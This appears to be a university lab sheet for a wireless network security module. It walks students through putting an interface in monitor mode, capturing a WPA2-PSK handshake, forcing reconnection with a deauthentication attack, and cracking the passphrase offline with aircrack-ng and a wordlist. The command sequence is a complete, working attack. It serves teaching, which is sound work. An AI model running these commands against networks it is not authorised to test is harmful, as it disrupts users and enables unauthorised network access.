
## Module Code: 6CSEF005W  
**Module name:** Wireless Network Security  
**Lab activity:** Capturing WPA2 Handshake and Offline Cracking  
**Author:** Dr Ayman El Hajjar  

---

#  Lab Activity: Capturing WPA2 Handshake & Cracking the Password

---

###  Objective

In this lab, you'll simulate a WPA2 handshake capture attack and attempt to crack the password offline using a dictionary attack. This illustrates the vulnerability of WPA2-PSK when weak passphrases are used.

---

### 📶 Target Network Details

- **SSID:** `6CSEF005W_WPA2_AP`  
- **Security:** WPA2-PSK  
- **Channel:** 6  
- **Passphrase (instructor use):** `StrongPass123`  
- **Goal:** Capture the handshake and crack the password offline

---

##  Step 1: Reconnaissance

Enable monitor mode and identify the target AP:

```bash
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon
```

> Take note of:
> - **BSSID** (MAC address of the target AP)
> - **Channel** used by the AP

---

##  Step 2: Capture the WPA2 Handshake

Replace `<BSSID>` and `<CH>` with values from Step 1:

```bash
sudo airodump-ng --bssid <BSSID> --channel <CH> --write wpa2_handshake wlan0mon
```

You will need a client to (re)connect to the AP. If no clients are active, force a reauthentication:

```bash
sudo aireplay-ng --deauth 5 -a <BSSID> wlan0mon
```

> Once a handshake is captured, you'll see:  
> `WPA handshake: <BSSID>` at the top right of the terminal.

---

## 💾 Step 3: Crack the Password (Offline)

Use a wordlist such as `rockyou.txt` (or another custom dictionary):

```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <BSSID> wpa2_handshake-01.cap
```

If the passphrase is in the wordlist, `aircrack-ng` will output it.

---

##
 Discussion Points

- WPA2-PSK is vulnerable to **offline dictionary attacks**.
- An attacker does **not** need to know the passphrase to capture the handshake.
- Strong, complex passphrases can **resist offline cracking**, even if handshake is leaked.

---

##
 Cleanup

Stop monitor mode and restore the network interface:

```bash
sudo airmon-ng stop wlan0mon
```

---

##  Optional Screenshots

You may include screenshots in `tasks/img/`:
- `airodump-ng` displaying handshake
- `aircrack-ng` cracking output
- Deauth attack in `aireplay-ng`

---

## Summary


| Phase    | Tool             | Purpose                          |
|----------|------------------|----------------------------------|
| Recon    | `airodump-ng`    | Discover target AP & clients     |
| Attack   | `aireplay-ng`    | Force client to reconnect        |
| Capture  | `airodump-ng`    | Save WPA2 handshake              |
| Cracking | `aircrack-ng`    | Attempt dictionary attack offline|

---



---

##  Background: How WPA/WPA2 Cracking Works

WPA and WPA2 are improvements over WEP, with WPA2 using AES-CCMP as its encryption method. They support two types of authentication:

- **WPA/WPA2-Enterprise**: Uses EAP with a RADIUS server.
- **WPA/WPA2-Personal (PSK)**: Uses a pre-shared key.

The vulnerability lies in the **WPA2-PSK 4-way handshake**, which can be captured and replayed offline. Here's a simplified breakdown:

1. A client connects to a WPA2-PSK network, initiating a 4-way handshake.
2. An attacker nearby captures this handshake using tools like `airodump-ng`.
3. The attacker does **not** need to be connected or authenticated.
4. The attacker uses a dictionary (wordlist) and brute-forces possible passphrases using `aircrack-ng`.
5. The tool derives the Pairwise Transient Key (PTK) using:
   - The captured handshake
   - SSID
   - Client & AP MAC addresses
   - Two nonces (ANonce, SNonce)
6. Each guessed passphrase is tested for integrity against the handshake.

The process uses a key derivation function (PBKDF2) and matches the MIC (Message Integrity Code) for success.

If the passphrase exists in the dictionary, it will be recovered.

---

##
 Visual Recap: WPA2 Handshake Cracking

1. Monitor mode activated on interface
2. Capture handshake via `airodump-ng`
3. Force reconnection using `aireplay-ng` (deauth)
4. Crack handshake with a dictionary using `aircrack-ng`

---

